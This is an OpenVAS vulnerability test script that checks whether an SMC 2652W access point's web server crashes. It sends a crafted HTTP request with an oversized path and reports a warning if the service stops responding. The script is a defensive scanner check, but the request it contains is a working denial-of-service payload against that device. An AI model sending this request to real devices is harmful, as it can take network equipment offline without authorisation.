# OpenVAS Vulnerability Test
# $Id: smc_www_dos.nasl 17 2013-10-27 14:01:43Z jan $
# Description: Crash SMC AP
#
# Authors:
# John Lampe ... j_lampe@bellsouth.net
# changes by rd:
# -fill the Host header to work through a transparent proxy
# -use http_is_dead() to determine success of script
#
# Copyright:
# Copyright (C) 2002 John Lampe ... j_lampe@bellsouth.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "The remote SMC 2652W Access point web server crashes when sent a 
specially formatted HTTP request.";

tag_solution = "Contact vendor for a fix";

if(description)
{
    script_id(11141);
    script_version("$Revision: 17 $");
    script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
    script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
    script_tag(name:"cvss_base", value:"5.0");
    script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
    script_tag(name:"risk_factor", value:"Medium");
    name = "Crash SMC AP";
    script_name(name);
    desc = "
    Summary:
    " + tag_summary + "
    Solution:
    " + tag_solution;

    script_description(desc);
    summary = "Crash SMC Access Point";
    script_summary(summary);
    script_category(ACT_DENIAL);
    script_copyright("This script is Copyright (C) 2002 John Lampe...j_lampe@bellsouth.net");
    family = "Denial of Service";
    script_family(family);
    script_dependencies("find_service.nasl");
    script_require_ports("Services/www", 80);
    if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
      script_tag(name : "solution" , value : tag_solution);
      script_tag(name : "summary" , value : tag_summary);
    }
    exit(0);
}

#
# The script code starts here
#
# found with SPIKE 2.7 http://www.immunitysec.com/spike.html
# req string directly horked from SPIKE API

include ("http_func.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);

if(http_is_dead(port: port))exit(0);

req = string("GET /", crap(240), ".html?OpenElement&FieldElemFormat=gif HTTP/1.1\r\n");
req = string(req, "Referer: http://localhost/bob\r\n");
req = string(req, "Content-Type: application/x-www-form-urlencoded\r\n");
req = string(req, "Connection: Keep-Alive\r\n");
req = string(req, "Cookie: VARIABLE=FOOBAR; path=/\r\n");
req = string(req, "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\r\n");
req = string(req, "Variable: result\r\n");
req = string(req, "Host: ", get_host_name(), "\r\nContent-length: 13\r\n");
req = string(req, "Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png\r\n");
req = string(req, "Accept-Encoding: gzip\r\nAccept-Language:en\r\nAccept-Charset: iso-8859-1,*,utf-8\r\n\r\n");


soc = http_open_socket(port);
if (soc) {
  send(socket:soc, data:req);
  close(soc);
}


if(http_is_dead(port: port))
{
  security_warning(port);
}





